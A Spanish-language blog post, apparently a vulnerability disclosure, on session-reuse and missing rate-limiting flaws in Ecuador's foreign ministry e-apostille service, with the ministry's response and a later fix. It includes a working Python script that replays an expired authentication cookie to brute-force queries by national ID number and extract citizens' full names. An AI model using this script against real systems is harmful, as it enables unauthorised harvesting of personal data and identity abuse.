---
pubDatetime: 2025-03-08
title: Atacando el Sistema de Apostillas | Cancilleria.gob.ec
description: Explotando fallas en el sistema de apostillas del Ecuador.
featured: false
author: eserror
tags:
  - cancilleria
  - vulnerabilidad
---

Por alguna razón, hace unos meses recibí un correo de parte del Ministerio de Relaciones Exteriores y Movilidad Humana del Ecuador. Este correo anunciaba la disponibilidad de un [nuevo servicio](https://www.cancilleria.gob.ec/2024/07/15/sistema-de-apostillas-y-legalizaciones-electronicas-del-ecuador/) público, el cual permitía apostillar documentos electrónicos de forma oficial.

El día de hoy, he decido escribir un artículo donde exploto unas vulnerabilidades que he encontrado mientras navegaba por el sitio.

## Authentication Bypass

La aplicación falla al comprobar la validez de una cookie/sesión previamente expirada, esto permite a un atacante reusar la sesión y realizar acciones en nombre del usuario.

Es decir, si un atacante consigue robar una sesión de usuario, él podrá realizar acciones en la cuenta o sesión de usuario como si tuviera las credenciales o autorización para realizar dichas acciones.

En la imagen de abajo, se puede ver cómo la aplicación reacciona al recibir una solicitud sin una cookie en de autenticación en las cabeceras HTTP.

<img src="/src/assets/images/Screenshot 2024-12-24 at 16.32.12.png">

En la siguiente imágen, se muestra la respuesta de la aplicación ante una solicitud HTTP que incluye una cookie ya expirada.

<img src="/src/assets/images/Screenshot 2024-12-24 at 16.41.29.png">

En la imágen de arriba, se puede ver cómo claramente la aplicación falla al mostrar información sensible de otro usuario, mientras se hace uso de una sesion invalida. A pesar de existir una redirección, que idealmente debe llevar al usuario a volver a iniciar sesión, la aplicación entrega información de cualquier usuario para el cual se conozca su cédula, sin validar el tiempo de vida de la sesion.

## Lack of Rate Limiting

La aplicación no pone un límite a la cantidad de solicitudes que un usuario puede realizar, lo cuál permite a un atacante realizar ataques de fuerza bruta para conseguir información privada de un usuario. La explotación de estás vulnerabilidades implica que un atacante puede realizar la suplantación de identidades de usuario e incluso causar interrupciones en el servicio.

El siguiente código pretende explotar dos vulnerabilidades, una falla en el mecanismo de autenticación, y la falta de implementación de un mecanismos que eviten solicitudes reiteradas.

```python
#!/bin/python3

import requests
import urllib3
import re
import json

urllib3.disable_warnings()
s = requests.Session();


def brute_force():

## Es necesario obtener una cookie expirada o valida.

headers = {

"Cookie": "ASP.NET_SessionId=mldtgtkittjfy31eoz1ekp4s; .ASPXAUTH=2F1537AFB2BCEC54CD9429AF1F963DBEE3282C7EA685EBA4A6E9E62D485A8A98C4AA3D35D4261681186D8E96386A74613753B4FB2A1B20D04B2BD18550AF732AA2D460C7BEF5B9661CF9B5AEB386F802B5E4698B6FD42011F855E4F6018DD7E133FA4A1255FAF637B711D544DFF0698DFC6C5CC2408D21CEB023F453085EF9BF63BA1065C99A8FF992B23C1FE0CA3B5AF28ED6050A425CE12A532E123A13E9AC3D4CC5BD1EF63EAE6ED38E7B77E0E32A5A70E3A71FDE5D75C4A7D4E70E8132CD",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
"X-Requested-With": "XMLHttpRequest",
"Accept-Encoding": "gzip, deflate, br"
}

# Reemplazar por las cedulas que desees consultar

cedulas = ('CEDULA0','CEDULA1', 'CEDULA2','CEDULA3', 'CEDULA4')

for cedula in cedulas:

data = {"numeroDocumento": cedula}
respuesta = s.get('https://eapostillas.cancilleria.gob.ec/Solicitud/ConsultarDatosRegistroCivil?numeroDocumento', data=data, headers=headers, verify=False, allow_redirects=False)

texto_html = respuesta.text
patron = r'(?s)\s*(\{.*\})'
match = re.search(patron, texto_html)
json_data = match.group(1)
data = json.loads(json_data)

print(data['resultado']['NombresCompletos'])


if __name__ == "__main__":

brute_force()
```

## Respuesta de la Cancilleria

Después de varias semanas de espera, por fin obtuve una respuesta, sin embargo esta fue muy decepcionante.

Debo aclarar que, para entender el problema que expongo, no es necesario conocimientos avanzados en sistemas informáticos. Así que, tengo que admitir que no esperaba una respuesta como esta, mucho menos cuando solemos asumir que dos cabezas piensan mejor que una.

El siguiente informe pretende dar una respuesta sobre las vulnerabilidades reportadas, sin embargo, ustedes pueden juzgar por si mismos.

<iframe src="https://drive.google.com/file/d/1lrfjMORi2kzgDZKoa2Bj39AtHxN9UnUO/preview" width="750" height="650" frameborder="0"></iframe>

## "The Fix"

Después de haber leido la respuesta a mi reporte de vulnerabilidades, haber invertido tiempo y esfuerzo en este asunto, naturalmente uno puede llegar a la conclusion que ha sido un esfuerzo en vano.

Pero no es así, ya que el día de hoy revisando nuevamente el serivicio de apostillas, he descubierto un pequeño cambio. Se ha agregado el parámetro token1, el cual asumo fue implementado para evitar reiteradas consultas al servicio.

Al mismo tiempo, se puede observar que la aplicación valida efectivamente si la sesión de un usuario ha expirado, y de acuerdo a esto, decide si mostrar la información solicitada o no.

<img src="/src/assets/images/Screenshot 2025-03-08 at 01.09.48.png">

A pesar de que el proceso de remediación no fue tan fluido como esperaba, y muchos inconvenientes en el camino, aún así vale la pena aportar un granito de arena a la seguridad del país. 🫶
